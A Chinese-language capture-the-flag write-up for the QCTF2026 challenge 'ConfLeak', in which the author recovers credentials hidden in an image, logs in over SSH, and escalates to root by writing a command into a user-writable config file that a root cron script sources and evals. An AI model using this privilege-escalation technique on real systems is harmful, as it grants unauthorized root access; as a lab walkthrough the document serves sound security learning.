---
title: ConfLeak（QCTF2026 web）
date: 2026-10-30
category: Misc
tags:
  - CTF
  - Writeup
  - misc
draft: false
summary: "说好的 misc，结果一关一关走成了 SSH 登录 + cron 脚本提权"
collection: QCTF2026
---

# ConfLeak

## 第一节：题目

说好的misc呢？？骗你的只有第一步是misc
666还有第四关
## 第二节：过程

首先根据题意我们注册一个账号然后看到里面的系统提示说053照片有admin账号密码，然后下载下来之后发现里面藏了个zip文件，直接解压之后打开可以发现
```text
用户名：FrostVoyage72
密码：K9s$pR2q@Lz8
```

然后我们就可以登录了，这是第一关
![](/assets/posts/qctf2026/qctf2026-misc-confleak-1.png)
![](/assets/posts/qctf2026/qctf2026-misc-confleak-2.png)

接下来我们要连到后台，然后因为普通用户的公告上写着测试是在总部的，因此很简单我们就可以找到登录到后台的账号密码——jinchu 密码是 A005201903 这是第二关
然后用
```bash
ssh jinchu@host -p port
```
后面让你写个yes你就写个yes然后就可以输密码了，输完之后就可以进了
这是第三关
```bash
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jinchu@dep-23fc01a9-4846-42db-9167-ff61d4f44472-7757bcdc9f-dmrgp:~$ ls -l
total 4
drwxr-xr-x 1 jinchu jinchu 4096 Sep 20 12:41 log
```

而我们虽然找到了root的位置但是我们没有权限，这个时候我们就要提权了，我们翻翻有没有什么能提权的
最终发现是在`/opt/inspector/nightly_inspect.sh`

```bash
jinchu@dep-23fc01a9-4846-42db-9167-ff61d4f44472-7757bcdc9f-dmrgp:~$ cat /etc/crontab /etc/cron.d/* 2>/dev/null
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /opt/inspector/nightly_inspect.sh
```

最下面的`* * * * * root /opt/inspector/nightly_inspect.sh`则是作为定时任务来执行的（5个\* 是每分钟每小时每天每月无论星期几都会执行的意思，也就是一分钟以 root 的形式执行一次nightly_inspect.sh），而问题就在于，我们cat一下这个文件

```bash
jinchu@dep-23fc01a9-4846-42db-9167-ff61d4f44472-7757bcdc9f-dmrgp:/opt/inspector$ cat nightly_inspect.sh
#!/bin/bash
# 系统夜间巡检脚本 - 兼容旧版用户级配置
LOG_FILE="/var/log/nightly_inspect.log"
USER_CONFIG="/home/jinchu/.config/inspector/inspect.env"

# 初始化日志
echo "===== $(date '+%Y-%m-%d %H:%M:%S') 巡检任务启动 =====" >> "$LOG_FILE"

# 兼容逻辑：加载负责人维护的用户级配置
if [ -f "$USER_CONFIG" ]; then
    source "$USER_CONFIG"
    echo "[INFO] 已加载用户自定义巡检配置" >> "$LOG_FILE"
fi

# 基础系统巡检
echo "[BASE] 磁盘使用率检查完成" >> "$LOG_FILE"
echo "[BASE] 内存状态检查完成" >> "$LOG_FILE"

# 执行用户自定义扩展巡检命令
if [ -n "$CUSTOM_TASK" ]; then
    echo "[CUSTOM] 执行自定义巡检指令" >> "$LOG_FILE"
    eval "$CUSTOM_TASK" >> "$LOG_FILE" 2>&1
fi
echo "===== $(date '+%Y-%m-%d %H:%M:%S') 巡检任务结束 =====" >> "$LOG_FILE"
```

```bash
if [ -f "$USER_CONFIG" ]; then
    source "$USER_CONFIG"
    echo "[INFO] 已加载用户自定义巡检配置" >> "$LOG_FILE"
fi
```
我这样的用户是有读写权限的！
而且
```bash
if [ -n "$CUSTOM_TASK" ]; then
    echo "[CUSTOM] 执行自定义巡检指令" >> "$LOG_FILE"
    eval "$CUSTOM_TASK" >> "$LOG_FILE" 2>&1
fi
```
它会当作真的命令 eval 执行，那我们要做的就是在这里写一个可以读取flag的命令就行了

接下来写payload
既然已经告诉我们在哪里写了，那我们就在那里写
```bash
USER_CONFIG="/home/jinchu/.config/inspector/inspect.env"
```

接下来只要
```bash
mkdir -p ~/.config/inspector
echo 'CUSTOM_TASK="cat /root/flag > /home/jinchu/flag.txt"' > ~/.config/inspector/inspect.env
```
然后我们cat一下看看也没有写好
```bash
jinchu@dep-23fc01a9-4846-42db-9167-ff61d4f44472-7757bcdc9f-dmrgp:/opt/inspector$ cat ~/.config/inspector/inspect.env
CUSTOM_TASK="cat /root/flag > /home/jinchu/flag.txt"
```
然后等60秒之后我们就可以把flag挪到自己可读的范围了
```bash
jinchu@dep-23fc01a9-4846-42db-9167-ff61d4f44472-7757bcdc9f-dmrgp:/opt/inspector$ sleep 60
ls -l ~/flag.txt
cat ~/flag.txt
-rw-r--r-- 1 root root 43 Oct 30 16:13 /home/jinchu/flag.txt
QCTF{3c523603-1449-45c4-a582-732c6230cbf3}
```

最后复现flag：
`QCTF{3c523603-1449-45c4-a582-732c6230cbf3}`